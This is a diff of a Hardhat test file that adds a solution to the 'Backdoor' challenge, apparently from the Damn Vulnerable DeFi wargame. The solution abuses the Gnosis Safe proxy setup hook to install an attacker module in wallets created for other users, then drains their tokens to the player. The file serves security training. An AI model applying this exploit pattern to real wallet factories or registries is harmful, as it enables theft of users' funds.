@@ -16,7 +16,7 @@ describe('[Challenge] Backdoor', function () {
         masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
         walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
         token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
-        
+
         // Deploy the registry
         walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
             masterCopy.address,
@@ -45,8 +45,73 @@ describe('[Challenge] Backdoor', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        let abi1,
+        abi2,
+        abi3,
+        iface1,
+        iface2,
+        iface3,
+        initializer,
+        data,
+        newWallet,
+        newWallets = [];
+      const Backdoor = await ethers.getContractFactory("BackDoor");
+      const backdoor = await Backdoor.deploy(token.address, player.address);
+  
+      const FakeMaster = await ethers.getContractFactory("FakeMaster");
+      const fakeMaster = await FakeMaster.deploy();
+      //Create proxies and register wallets through createProxyWithCallback();
+      //And use fakeMaster as setupModule receipient to register backDoor attacker as whitelisted module;
+      abi1 = [
+        `function setup(
+          address[] calldata _owners,
+          uint256 _threshold,
+          address to,
+          bytes calldata data,
+          address fallbackHandler,
+          address paymentToken,
+          uint256 payment,
+          address payable paymentReceiver)`,
+      ];
+      iface1 = new ethers.utils.Interface(abi1);
+      abi2 = [`function enableModule2(address module)`];
+      iface2 = new ethers.utils.Interface(abi2);
+      data = iface2.encodeFunctionData("enableModule2", [backdoor.address]);
+      for (i = 0; i < users.length; i++) {
+        initializer = iface1.encodeFunctionData("setup", [
+          [users[i]],
+          1,
+          fakeMaster.address,
+          ethers.utils.arrayify(data),
+          ethers.constants.AddressZero,
+          ethers.constants.AddressZero,
+          0,
+          ethers.constants.AddressZero,
+        ]);
+        await walletFactory.createProxyWithCallback(
+          masterCopy.address,
+          initializer,
+          0,
+          walletRegistry.address
+        );
+        newWallet = await walletRegistry.wallets(users[i]);
+        newWallets.push(newWallet);
+        console.log(`new wallet for user ${users[i]} is at ${newWallets[i]}`);
+        expect(await token.balanceOf(newWallets[i])).to.eq(10n * 10n ** 18n);
+      }
+      //Prepare calldata for backDoor attacker to pass to newWallets to execute;
+      abi3 = ["function transfer(address to, uint256 amount)"];
+      iface3 = new ethers.utils.Interface(abi3);
+      data = iface3.encodeFunctionData("transfer", [
+        player.address,
+        ethers.utils.parseEther("10"),
+      ]);
+      //Execute attack from backDoor contract through signer: player
+      await backdoor.connect(player).execute(newWallets, data);
+      let bal = await token.balanceOf(player.address);
+      console.log("Player balance is", ethers.utils.formatEther(bal));
     });
+  
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
@@ -56,7 +121,7 @@ describe('[Challenge] Backdoor', function () {
 
         for (let i = 0; i < users.length; i++) {
             let wallet = await walletRegistry.wallets(users[i]);
-            
+
             // User must have registered a wallet
             expect(wallet).to.not.eq(
                 ethers.constants.AddressZero,
